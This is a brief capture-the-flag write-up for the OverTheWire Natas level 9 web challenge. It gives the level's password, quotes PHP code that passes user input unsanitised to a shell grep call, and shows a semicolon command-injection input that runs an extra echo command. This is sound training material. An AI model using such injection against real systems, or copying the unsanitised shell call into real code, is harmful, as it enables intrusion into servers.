## [Natas Level 9->10](http://natas9.natas.labs.overthewire.org)
#### Natas9 Password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

Looking at the source code, we find:
````
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
````

It looks like $key is the input in "grep -i $key dictionary.txt". If we use a semicolon somewhere in our input, we can divide the line into >1 command.

For example, using the input '; echo "hi";' will exec the command
````console
grep -i ; echo "hi"; dictionary.txt
````
causing the Output to say "hi".

